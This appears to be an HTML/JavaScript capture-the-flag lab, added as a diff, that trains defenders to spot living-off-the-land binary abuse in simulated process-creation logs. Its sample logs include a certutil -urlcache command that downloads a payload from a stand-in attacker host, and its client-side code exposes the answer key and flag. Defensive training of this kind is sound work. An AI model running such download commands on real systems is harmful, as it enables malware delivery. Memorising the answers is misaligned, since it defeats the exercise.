@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>CTF: Hunt for LOLBins | Process Creation Logs</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Fira Code', system-ui, monospace; }
+    body {
+      background: linear-gradient(160deg, #0d1117 0%, #161b22 100%);
+      min-height: 100vh; display: flex; align-items: center; justify-content: center;
+      padding: 1.5rem; margin: 0;
+    }
+    .container {
+      max-width: 1150px; width: 100%; background: rgba(22, 27, 34, 0.9);
+      backdrop-filter: blur(28px); border: 1px solid rgba(0, 255, 128, 0.25);
+      box-shadow: 0 25px 50px rgba(0, 200, 100, 0.15); border-radius: 2.8rem;
+      padding: 2rem; color: #c9d9f0;
+    }
+    h1 { font-size: 2.3rem; font-weight: 700; text-align: center; background: linear-gradient(135deg, #3dfc8c, #1ca350); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 0.4rem; letter-spacing: 1px; }
+    .subtitle { text-align: center; color: #8baac4; margin-bottom: 1.8rem; border-bottom: 1px dashed #2d3b4a; padding-bottom: 1rem; font-style: italic; }
+    .panel { background: rgba(13, 17, 23, 0.8); backdrop-filter: blur(12px); border-radius: 1.8rem; padding: 1.7rem; border: 1px solid #2d405b; margin-bottom: 1.8rem; }
+    .hidden { display: none !important; }
+    input, button { background: #0d1a26; border: 1px solid #345236; border-radius: 2rem; padding: 0.7rem 1.3rem; color: #d4f0e0; font-weight: 500; outline: none; font-size: 0.9rem; }
+    input:focus { border-color: #2ee67e; box-shadow: 0 0 14px #1db954; }
+    button { background: #1a3328; border-color: #2ea85a; cursor: pointer; font-weight: bold; display: inline-flex; align-items: center; gap: 0.3rem; }
+    button:hover { background: #234d38; border-color: #5cff9e; box-shadow: 0 0 18px #28a745; }
+    .task-card { background: #0b1219; border-left: 6px solid #28a745; padding: 1.2rem; border-radius: 1.3rem; margin: 1.2rem 0; animation: fadeSlide 0.35s ease; }
+    @keyframes fadeSlide { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0); } }
+    .log-line { background: #02070e; border: 1px solid #1f3344; padding: 0.5rem 1rem; border-radius: 0.6rem; margin: 0.4rem 0; font-family: 'Fira Code', monospace; font-size: 0.78rem; white-space: pre-wrap; color: #bdd4ff; }
+    .badge { background: #1f3a2f; padding: 0.2rem 0.9rem; border-radius: 20px; font-size: 0.8rem; }
+    .process-tree { background: #030a10; border: 1px solid #2c4a3a; border-radius: 1rem; padding: 1rem; margin: 1rem 0; font-family: monospace; white-space: pre; color: #a5d6b8; overflow-x: auto; }
+    .flag-box { background: #0b1f15; border: 2px dashed #3dfc8c; padding: 0.9rem; border-radius: 20px; text-align: center; font-weight: bold; font-size: 1.4rem; letter-spacing: 3px; color: #7effa1; animation: glowPulse 1.7s infinite; }
+    @keyframes glowPulse { 0% { box-shadow: 0 0 5px #1db954; } 50% { box-shadow: 0 0 28px #0f9b4a; } 100% { box-shadow: 0 0 5px #1db954; } }
+    .success-msg { color: #9effb7; font-weight: bold; }
+    .toast { position: fixed; top: 20px; right: 20px; background: #1a3328; border: 1px solid #2ea85a; padding: 1rem 1.5rem; border-radius: 2rem; color: #7effa1; font-weight: bold; z-index: 9999; animation: slideIn 0.3s ease, fadeOut 0.3s 2.5s forwards; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+    @keyframes slideIn { from { transform: translateX(100px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+    @keyframes fadeOut { to { opacity: 0; transform: translateY(-10px); } }
+    code { background: #0d1a26; padding: 0.2rem 0.5rem; border-radius: 12px; }
+  </style>
+</head>
+<body>
+<div class="container" id="appContainer">
+
+  <!-- LOGIN SECTION -->
+  <div id="loginSection">
+    <h1>🕵️ LOLBIN HUNTER</h1>
+    <div class="subtitle">Living-off-the-Land Binaries · Process Creation Analysis</div>
+    <div class="panel">
+      <div style="text-align:center;">
+        <input type="text" id="studentNameInput" placeholder="Enter your name" autocomplete="off" style="width:70%;">
+        <input type="password" id="studentPassInput" placeholder="Enter password" style="width:70%; margin-top:0.7rem;">
+        <button id="studentSubmitLogin" style="margin-top:0.8rem;">🔐 Enter CTF Lab</button>
+        <p style="font-size:0.8rem; color:#8ba0bc; margin-top:0.5rem;">
+          Password: <code>45_2026</code>
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <!-- STUDENT DASHBOARD -->
+  <div id="studentDashboard" class="hidden">
+    <div style="display:flex; justify-content:space-between; align-items:center;">
+      <h2 style="color:#5cf08b;">👤 <span id="displayStudentName"></span></h2>
+      <button id="logoutStudentBtn">🚪 Logout</button>
+    </div>
+    <div id="taskContainer"></div>
+  </div>
+
+</div>
+
+<script>
+(function() {
+    const FIXED_PASSWORD = '45_2026';
+    const STORAGE_KEY = 'lolbin_ctf_progress';
+    
+    let currentUser = null;
+    let completedTasks = [];
+
+    function loadProgress() {
+        try {
+            const saved = localStorage.getItem(STORAGE_KEY);
+            if (saved) {
+                const data = JSON.parse(saved);
+                completedTasks = data.completed || [];
+                return data.name;
+            }
+        } catch(e) {}
+        return null;
+    }
+
+    function saveProgress() {
+        if (currentUser) {
+            localStorage.setItem(STORAGE_KEY, JSON.stringify({
+                name: currentUser.name,
+                completed: currentUser.completedTasks
+            }));
+        }
+    }
+
+    const tasks = [
+      { id: 1, title: "📥 Task 1: LOLBin for Downloads", desc: "Which LOLBin is commonly used by attackers to download files from the internet? (executable name)", answer: "certutil" },
+      { id: 2, title: "📊 Task 2: Anomalous Parent-Child", desc: "From process logs below, which parent process spawned PowerShell? (process name .exe)", answer: "excel.exe", extra: "procTree" },
+      { id: 3, title: "🔍 Task 3: Suspicious Command Line", desc: "Find the command line that uses certutil with -urlcache flag. What is the target URL? (full URL)", answer: "http://evil.com/payload.exe", extra: "cmdLine" },
+      { id: 4, title: "⚖️ Task 4: Legitimacy Check", desc: "Is there any legitimate admin script that uses certutil -urlcache in this environment? (yes/no)", answer: "no", extra: "legitimacy" },
+      { id: 5, title: "🛡️ Task 5: Blocking Recommendation", desc: "What type of rule should block LOLBin abuse? (three words)", answer: "application whitelisting" }
+    ];
+
+    const processEvents = [
+      "Process Create: winword.exe (PID 4520) → cmd.exe (PID 4521)",
+      "Process Create: excel.exe (PID 5580) → powershell.exe (PID 5581)",
+      "Process Create: powershell.exe (PID 5581) → certutil.exe -urlcache -f http://evil.com/payload.exe C:\\Temp\\bad.exe",
+      "Process Create: explorer.exe (PID 1200) → mshta.exe (PID 1201)",
+      "Process Create: svchost.exe (PID 800) → legitimate_service.exe"
+    ];
+
+    const commandLines = [
+      "certutil.exe -urlcache -f http://evil.com/payload.exe C:\\Temp\\bad.exe",
+      "certutil.exe -encode input.txt output.txt",
+      "mshta.exe javascript:alert('test')"
+    ];
+
+    function showToast(message, isError = false) {
+      const existing = document.querySelector('.toast');
+      if (existing) existing.remove();
+      const toast = document.createElement('div');
+      toast.className = 'toast';
+      toast.style.background = isError ? '#3a1a1a' : '#1a3328';
+      toast.style.borderColor = isError ? '#aa3030' : '#2ea85a';
+      toast.style.color = isError ? '#ffaaaa' : '#7effa1';
+      toast.textContent = message;
+      document.body.appendChild(toast);
+      setTimeout(() => { if (toast.parentNode) toast.remove(); }, 3000);
+    }
+
+    function renderTasks() {
+      if (!currentUser) return;
+      document.getElementById('displayStudentName').innerText = currentUser.name;
+      const container = document.getElementById('taskContainer');
+      const completed = currentUser.completedTasks || [];
+      
+      let html = '<h3 style="margin-bottom:1rem;">🌳 Interactive Process Tree Visualization</h3>';
+      
+      html += '<div class="process-tree">';
+      html += '🖥️ SYSTEM PROCESS TREE (simulated live)\n';
+      html += '├─ winword.exe (4520)\n│  └─ cmd.exe (4521)\n';
+      html += '├─ <span style="color:#ff8888;">excel.exe (5580)</span> ⚠️\n';
+      html += '│  └─ <span style="color:#ff6666;">powershell.exe (5581)</span> 🔴\n';
+      html += '│     └─ <span style="color:#ff4444;">certutil.exe -urlcache ...</span> 💀\n';
+      html += '├─ explorer.exe (1200)\n│  └─ mshta.exe (1201)\n';
+      html += '└─ svchost.exe (800) [legitimate]\n';
+      html += '</div>';
+      html += '<p style="font-size:0.75rem; color:#8baac4; margin-bottom:1rem;">🔴 Red indicates suspicious parent-child relationship</p>';
+
+      tasks.forEach(task => {
+        const done = completed.includes(task.id);
+        html += `<div class="task-card" style="border-left-color: ${done ? '#2ecc71' : '#28a745'};">`;
+        html += `<strong>${task.title}</strong> <span class="badge">${done ? '✅ Complete' : '🔒 Pending'}</span>`;
+        html += `<p style="margin:0.4rem 0;">${task.desc}</p>`;
+
+        if (task.extra === 'procTree') {
+          html += '<div class="log-line">📋 Process Creation Events (Sysmon Event 1):</div>';
+          processEvents.forEach(e => {
+            const sus = e.includes('excel.exe') || e.includes('certutil');
+            html += `<div class="log-line" style="${sus ? 'border-left: 3px solid #ff4444;' : ''}">${e}</div>`;
+          });
+        } else if (task.extra === 'cmdLine') {
+          html += '<div class="log-line">📜 Captured Command Lines:</div>';
+          commandLines.forEach(c => {
+            const mal = c.includes('urlcache') && c.includes('evil.com');
+            html += `<div class="log-line" style="${mal ? 'border-left: 3px solid #ff4444;' : ''}">${c}</div>`;
+          });
+        } else if (task.extra === 'legitimacy') {
+          html += '<div class="log-line">📁 Admin Scripts Directory: C:\\Admin\\Scripts\\</div>';
+          html += '<div class="log-line">📄 Contents: <span style="color:#ff8888;">(empty - no legitimate scripts found)</span></div>';
+          html += '<div class="log-line">📅 Scheduled Tasks: None reference certutil -urlcache</div>';
+        }
+
+        if (!done) {
+          html += `<div style="display:flex; gap:0.5rem; margin-top:0.5rem;">
+            <input type="text" id="answerInput${task.id}" placeholder="Your answer" style="flex:1;">
+            <button onclick="window.submitTask(${task.id})">✅ Submit</button>
+          </div>`;
+        } else {
+          html += '<p class="success-msg">✔ Task Completed Successfully</p>';
+        }
+        html += '</div>';
+      });
+
+      if (completed.length === tasks.length) {
+        html += '<div class="flag-box">🏆 FLAG{LOLBIN_DETECTED} 🏆</div>';
+        html += '<p style="text-align:center; color:#5cf08b;">🎉 Excellent investigation! All LOLBin hunting tasks completed.</p>';
+      }
+      
+      container.innerHTML = html;
+    }
+
+    window.submitTask = function(taskId) {
+      if (!currentUser) return;
+      const input = document.getElementById(`answerInput${taskId}`);
+      if (!input) return;
+      const ans = input.value.trim();
+      const task = tasks.find(t => t.id === taskId);
+      if (!task) return;
+      
+      if (ans.toLowerCase() === task.answer.toLowerCase()) {
+        if (!currentUser.completedTasks.includes(taskId)) {
+          currentUser.completedTasks.push(taskId);
+          saveProgress();
+        }
+        showToast('✅ Correct! Task completed.');
+        renderTasks();
+      } else {
+        showToast('❌ Incorrect. Analyze the evidence carefully.', true);
+        input.style.animation = 'shake 0.5s ease';
+        setTimeout(() => { input.style.animation = ''; }, 500);
+      }
+    };
+
+    function showLogin() {
+      document.getElementById('loginSection').classList.remove('hidden');
+      document.getElementById('studentDashboard').classList.add('hidden');
+      currentUser = null;
+    }
+
+    function showStudentDash() {
+      document.getElementById('loginSection').classList.add('hidden');
+      document.getElementById('studentDashboard').classList.remove('hidden');
+      renderTasks();
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const savedName = loadProgress();
+      if (savedName) document.getElementById('studentNameInput').value = savedName;
+      
+      document.getElementById('studentSubmitLogin').addEventListener('click', () => {
+        const name = document.getElementById('studentNameInput').value.trim();
+        const pass = document.getElementById('studentPassInput').value.trim();
+        
+        if (!name || !pass) { showToast('Enter name and password.', true); return; }
+        if (pass !== FIXED_PASSWORD) { showToast('Invalid password. Use: 45_2026', true); return; }
+        
+        currentUser = { name: name, completedTasks: [...completedTasks] };
+        document.getElementById('studentPassInput').value = '';
+        showStudentDash();
+      });
+
+      document.getElementById('logoutStudentBtn').addEventListener('click', () => {
+        showToast('Logged out. Progress saved!');
+        showLogin();
+      });
+
+      const style = document.createElement('style');
+      style.textContent = '@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-10px)}75%{transform:translateX(10px)}}';
+      document.head.appendChild(style);
+      showLogin();
+    });
+})();
+</script>
+</body>
+</html>
